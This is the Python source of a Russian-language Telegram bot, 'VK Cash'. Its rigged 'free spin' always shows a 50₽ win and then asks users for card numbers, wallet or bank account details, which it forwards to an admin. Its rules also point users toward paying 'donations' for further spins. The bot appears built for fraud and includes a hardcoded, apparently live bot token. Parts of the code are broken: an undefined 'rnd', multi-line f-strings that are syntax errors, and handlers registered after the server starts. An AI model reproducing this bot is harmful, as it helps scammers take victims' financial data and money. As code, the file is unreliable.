
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request
import re
import time
import random
import json
import os

API_TOKEN = '8135081615:AAFHaG7cgRaNlBAAEk_ALEP0-wHYzOniYbU'
ADMIN_ID = 6180147473

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)
user_states = {}
first_spin_done = {}

CODES_FILE = "codes.json"
if not os.path.exists(CODES_FILE):
    with open(CODES_FILE, "w") as f:
        json.dump({}, f)

def generate_code(amount, user_id):
    timestamp = int(time.time() * 1000)
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=4))
    code = f"CODE-{amount}-{timestamp}-{random_part}"
    with open(CODES_FILE, "r") as f:
        codes = json.load(f)
    codes[code] = {
        "user_id": user_id,
        "amount": amount,
        "used": False
    }
    with open(CODES_FILE, "w") as f:
        json.dump(codes, f, indent=4)
    return code

@bot.message_handler(commands=['start'])
def send_start(message):
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🎁 Крутить бесплатно", callback_data="free_spin"),
        InlineKeyboardButton("📜 Правила", callback_data="rules"),
        InlineKeyboardButton("❓ FAQ", callback_data="faq"),
        InlineKeyboardButton("📋 Политика", callback_data="policy")
    )
    bot.send_message(message.chat.id, "🎰 Добро пожаловать в VK Cash!\nВыбирай действие ниже:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "free_spin")
def handle_spin(call):
    uid = call.from_user.id
    if first_spin_done.get(uid):
        bot.answer_callback_query(call.id, "Бесплатная попытка уже использована.")
        return

    first_spin_done[uid] = True
    amount = 50

    msg = bot.send_message(call.message.chat.id, "🔄 Крутим колесо...\n[ 🎰 🎰 🎰 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍋 🍒 💣 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍉 💰 💣 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍀 💰 🍒 ]")
    time.sleep(1)

    code = generate_code(amount, uid)
    user_states[uid] = {"amount": amount, "code": code}
    message_text = f"🎉 *ПОБЕДА {amount}₽!* 🎉\n🎫 Код: `{code}`\n\n💳 Отправьте свои реквизиты:\n— Номер карты (Сбербанк, Тинькофф)\n— Или кошелёк (ЮMoney, Payeer, PayPal)\n— Или банк + номер счёта"
    bot.send_message(call.message.chat.id, message_text, parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def handle_message(m):
    uid = m.from_user.id
    if uid in user_states:
        state = user_states.pop(uid)
        code = state['code']
        with open(CODES_FILE, "r") as f:
            codes = json.load(f)
        if code not in codes:
            bot.send_message(m.chat.id, "❌ Код не найден. Попробуйте сначала.")
            return
        if codes[code]["user_id"] != uid:
            bot.send_message(m.chat.id, "❌ Этот код не принадлежит вам.")
            return
        if codes[code]["used"]:
            bot.send_message(m.chat.id, "⚠️ Этот код уже использован.")
            return

        payout_info = f"💰 Новая заявка:
👤 @{m.from_user.username or m.from_user.first_name}
🆔 {uid}
📦 Сумма: {state['amount']}₽
🔐 Код: {code}
💳 Реквизиты: {m.text}"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💸 Выплатить", callback_data=f"pay_{uid}_{code}"))
        bot.send_message(ADMIN_ID, payout_info, reply_markup=markup)
        bot.reply_to(m, "✅ Заявка отправлена! Ожидай выплату.")
    elif rnd.randint(1, 50) == 1:
        bot.send_message(m.chat.id, "👻 Пасхалка! Ты был выбран случайно. Получаешь +5 VKC!")
        add_vkcoins(uid, 5)
    else:
        bot.send_message(m.chat.id, "❌ Сначала крути колесо и получи код!")

@bot.callback_query_handler(func=lambda call: call.data.startswith("pay_"))
def handle_payment(call):
    parts = call.data.split("_")
    user_id = parts[1]
    code = "_".join(parts[2:])
    with open(CODES_FILE, "r") as f:
        codes = json.load(f)
    if code in codes:
        codes[code]["used"] = True
        with open(CODES_FILE, "w") as f:
            json.dump(codes, f, indent=4)
    bot.send_message(user_id, "💸 Выплата отправлена! Спасибо за участие 🙌")
    bot.answer_callback_query(call.id, "Выплата отмечена!")

@bot.callback_query_handler(func=lambda call: call.data in ["rules", "faq", "policy"])
def handle_info(call):
    info = {
        "rules": "📜 *Правила участия:*\n- Первая прокрутка — бесплатная\n- Повторная — вручную после доната\n- Суммы бонусов — от 50₽ до 500₽\n- После оплаты — случайный результат",
        "faq": "❓ *FAQ:*\n- *Как сыграть?* Нажми 'Крутить'\n- *Как снова сыграть?* Пока вручную, жди обновлений\n- *Как получить бонус?* Забери код и отправь реквизиты",
        "policy": "📋 *Политика:*\n- Проект — развлекательный\n- Результаты случайны\n- Возврата нет\n- Участие добровольное"
    }
    bot.send_message(call.message.chat.id, info[call.data], parse_mode="Markdown")

@app.route('/', methods=['GET', 'POST'])
def webhook():
    if request.method == 'POST':
        update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
        bot.process_new_updates([update])
        return 'OK', 200
    return 'Bot is running!', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)



@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Доступ запрещён.")
        return
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("📦 Список кодов", callback_data="admin_codes"),
        InlineKeyboardButton("💾 Скачать codes.json", callback_data="admin_download"),
        InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
    )
    bot.send_message(message.chat.id, "👑 Админ-панель:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def handle_admin_actions(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Нет доступа.")
        return

    if call.data == "admin_codes":
        with open(CODES_FILE, "r") as f:
            codes = json.load(f)
        text = "\n".join([f"{code} — {data['amount']}₽ — {'✅' if data['used'] else '🕓'}" for code, data in codes.items()])
        bot.send_message(call.message.chat.id, f"📦 Активные коды:\n{text[:4000]}")

    elif call.data == "admin_download":
        with open(CODES_FILE, "rb") as f:
            bot.send_document(call.message.chat.id, f)

    elif call.data == "admin_stats":
        with open(CODES_FILE, "r") as f:
            codes = json.load(f)
        total = len(codes)
        used = sum(1 for x in codes.values() if x['used'])
        pending = total - used
        bot.send_message(call.message.chat.id, f"📊 Статистика:\nВсего кодов: {total}\nВыплачено: {used}\nОжидают: {pending}")



VKCOIN_FILE = "vkcoins.json"
if not os.path.exists(VKCOIN_FILE):
    with open(VKCOIN_FILE, "w") as f:
        json.dump({}, f)

def add_vkcoins(user_id, amount):
    with open(VKCOIN_FILE, "r") as f:
        coins = json.load(f)
    coins[str(user_id)] = coins.get(str(user_id), 0) + amount
    with open(VKCOIN_FILE, "w") as f:
        json.dump(coins, f, indent=4)

def get_leaderboard(top_n=5):
    with open(CODES_FILE, "r") as f:
        codes = json.load(f)
    stats = {}
    for code, data in codes.items():
        if data["used"]:
            uid = data["user_id"]
            stats[uid] = stats.get(uid, 0) + data["amount"]
    sorted_stats = sorted(stats.items(), key=lambda x: x[1], reverse=True)
    return sorted_stats[:top_n]

@bot.message_handler(commands=['leaderboard'])
def leaderboard(message):
    top = get_leaderboard()
    text = "🏆 Топ участников по выигрышам:
"
    for i, (uid, amount) in enumerate(top, 1):
        text += f"{i}. ID {uid} — {amount}₽
"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['shop'])
def shop(message):
    with open(VKCOIN_FILE, "r") as f:
        coins = json.load(f)
    user_coins = coins.get(str(message.from_user.id), 0)
    markup = InlineKeyboardMarkup()
    if user_coins >= 10:
        markup.add(InlineKeyboardButton("🎰 Повторная попытка (10 VKC)", callback_data="buy_retry"))
    bot.send_message(message.chat.id, f"🛒 Магазин VK Coins:
У тебя {user_coins} VKC", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "buy_retry")
def buy_retry(call):
    uid = call.from_user.id
    with open(VKCOIN_FILE, "r") as f:
        coins = json.load(f)
    if coins.get(str(uid), 0) >= 10:
        coins[str(uid)] -= 10
        first_spin_done[uid] = False  # сброс попытки
        with open(VKCOIN_FILE, "w") as f:
            json.dump(coins, f, indent=4)
        bot.send_message(uid, "✅ Повторная попытка активирована! Крути снова.")
    else:
        bot.send_message(uid, "❌ Недостаточно VK Coins.")


